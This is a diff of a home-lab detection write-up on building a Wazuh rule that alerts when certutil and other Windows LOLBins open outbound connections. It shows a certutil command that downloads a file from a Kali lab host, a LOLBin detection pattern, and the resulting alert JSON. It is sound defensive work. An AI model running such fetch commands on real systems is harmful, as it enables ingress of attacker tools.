@@ -59,10 +59,97 @@ cmd  /c certutil -urlcache -split -f http://192.168.10.52:8000/tool.txt tool.txt
 
 The connection produced nothing. `certutil.exe` opened a socket to 192.168.10.52 on port 8000 and Sysmon wrote the Event 3 for it, and no shipped rule matched it.
 
+
 ## Detection Gap
+
+This follows a similar pattern to some of my previous findings. The command is in the alert word for word, and the only thing the alert says about it is that a cmd shell execution looked suspicious. 92032 matches on a parent image of `cmd.exe` with `/c`, so what it describes is the shape of the shell invocation and not anything certutil did, and it would have said the same thing about any other command passed to `cmd` the same way. The tags make the same point, because Account Discovery and Windows Command Shell are both true of the wrapper and neither one is the technique that ran.
+
+The connection is the part that has no coverage. certutil opening the socket produced a Sysmon Event 3, which is a separate event from the process creation that every alert above came from. Wazuh matches that to rule 61605, which is the base rule for Sysmon network connections and sits at level 0, so it produces no alert on its own and exists for other rules to chain onto. The only shipped rule that chains onto it is 92101, and that one requires PowerShell, so nothing underneath 61605 could match a connection opened by certutil. The event reached the manager and was checked against the ruleset, and then nothing came out of it.
+
 
 ## My Detection Rule
 
+**Version 1**
+
+```xml
+  <rule id="100106" level="10">
+    <if_sid>61605</if_sid>
+    <field name="win.eventdata.initiated">^true$</field>
+    <field name="win.eventdata.image" type="pcre2">(?i)(certutil|bitsadmin|mshta|regsvr32|replace)\.exe</field>
+    <description>Suspicious outbound connection opened by $(win.eventdata.image) to $(win.eventdata.destinationIp):$(win.eventdata.destinationPort).</description>
+    <mitre>
+      <id>T1105</id>
+    </mitre>
+  </rule>
+```
+
+The severity level of this rule is level 10, and it was for the same reason as 100105. This is because the alert is saying that something happened which somebody should look at, but not specifically that an attack occurred, and level 10 keeps it under the `email_alert_level` of 12 in `ossec.conf` so it does not mail every time the alert is paged.
+
+`<if_sid>61605</if_sid>` chains the rule onto the base Sysmon Event 3 rule, so that it gets evaluated on every network connection the endpoint reports rather than only the PowerShell ones. This is the same anchor that failed when I tried it on 100105, and the reason it works here is because of what each rule matches. Wazuh takes the first child that matches and stops, and 92101 sits under that same parent and claims PowerShell connections before anything else under there gets a look, which is what version 2 of 100105 ran into. None of the images in this rule are PowerShell, so 92101 cannot match these events at all, and my rule is the first thing under 61605 that does. That gives this rule more coverage than 100105, because 100105 only ever sees what PowerShell does and no change to its port list can widen that, while this one is looking at every connection on the endpoint before it decides anything. What stops it from firing on every false positive, is my own image list rather than a shipped rule sitting in front of it, and a list I wrote is a list I can extend.
+
+`win.eventdata.initiated` being `^true$` does the same job here as it does in 100105, which is restricting the rule to connections the endpoint opened itself. Sysmon writes true for outbound and false for inbound, and for T1105 the direction is the technique, since the transfer only happens if the endpoint reaches out and pulls the file in.
+
+`win.eventdata.image` is the field the whole rule rests on. Five binaries are named, `certutil`, `bitsadmin`, `mshta`, `regsvr32` and `replace`, and the claim underneath the rule is that none of them has a routine reason to open an outbound connection on this endpoint. That makes it a deny list, which is the opposite of what I did in 100105, and the reason is that the two sets are different sizes. Listing every program that legitimately makes a connection on a Windows machine is impossible, while listing the Microsoft binaries that are known for pulling files down is short enough to actually write. There is also nothing in this rule looking at the port or the address, because it doesn't matter where the LOLBin is connecting to as the program is enough of a suspicion on its own. 
+
+The description pulls the image and the destination into the alert text, so that `$(win.eventdata.image)` says which of the five programs fired the rule and `$(win.eventdata.destinationIp):$(win.eventdata.destinationPort)` says where it went, and both are readable off the alert list without opening anything. The MITRE tag is T1105, which puts the alert under Command and Control, the same tactic as 100105.
+
+
+
+
+**Verison 2**
+
+
 ## Custom Detection Rule Result
+
+**Version 1**
+
+<img width="1280" height="859" alt="image" src="https://github.com/user-attachments/assets/741e2c53-b3ef-4f64-8e02-3e42b0136081" />
+
+```json
+{
+  "agent": { "name": "Win-10-Endpoint-01", "ip": "192.168.10.51", "id": "001" },
+  "data": {
+    "win": {
+      "eventdata": {
+        "image": "C:\\Windows\\System32\\certutil.exe",
+        "user": "WIN10-ENDPT-1\\WazuhUser",
+        "processId": "2152",
+        "protocol": "tcp",
+        "initiated": "true",
+        "sourceIp": "192.168.10.51",
+        "sourcePort": "49751",
+        "destinationIp": "192.168.10.52",
+        "destinationPort": "8000",
+        "ruleName": "technique_id=T1218,technique_name=Signed Binary Proxy Execution"
+      },
+      "system": {
+        "eventID": "3",
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "eventRecordID": "87702"
+      }
+    }
+  },
+  "rule": {
+    "id": "100106",
+    "level": 10,
+    "description": "Suspicious outbound connection opened by C:\\Windows\\System32\\certutil.exe to 192.168.10.52:8000.",
+    "groups": ["sysmon", "local"],
+    "mitre": {
+      "id": ["T1105"],
+      "technique": ["Ingress Tool Transfer"],
+      "tactic": ["Command and Control"]
+    }
+  }
+}
+```
+
+100106 fired twice at level 10 and the description came out as "Suspicious outbound connection opened by C:\Windows\System32\certutil.exe to 192.168.10.52:8000." Both of the fields I pulled into it resolved, so which binary opened the connection and where it went are sitting there in the alert description without anybody having to open the alert to find them. That mattered more to me on this rule than on any of the others, because the binary is the entire reason the alert exists, and one telling me something connected somewhere without saying what or where would not be worth much.
+
+The reason there are two alerts rather than one is that a single certutil fetch opens two connections. The HTTP server on Kali logged two `GET /tool.txt` requests for every run of the test, and Sysmon wrote a network connection event for each of them. My rule matches on the connection, so one download of one file produced two alerts describing the same transfer. That is not a false positive since both events are real connections certutil genuinely opened, but it does mean the alert count from this rule reflects how many sockets a binary opened rather than how many files it fetched.
+
+The event behind it is Sysmon Event 3. `initiated` is true, `protocol` is tcp, and the connection runs from 192.168.10.51 on source port 49751 out to 192.168.10.52 on 8000. Those are the fields the rule read, and none of them were typed by anybody.
+
+The `ruleName` on the event reads `technique_id=T1218,technique_name=Signed Binary Proxy Execution`, which is not what happened here. T1218 covers a signed binary being used to execute something on an attacker's behalf, and certutil did not execute anything in this test, it fetched a file over HTTP and wrote it to disk. What the tag is describing is the kind of binary certutil is rather than what this particular connection was doing. The process creation event from the same run carries `technique_id=T1202,technique_name=Indirect Command Execution` instead, so the two events Sysmon wrote for one run are labelled with two different techniques, and the technique the test was actually running is not either of them.
+
 
 ## Coverage Limits
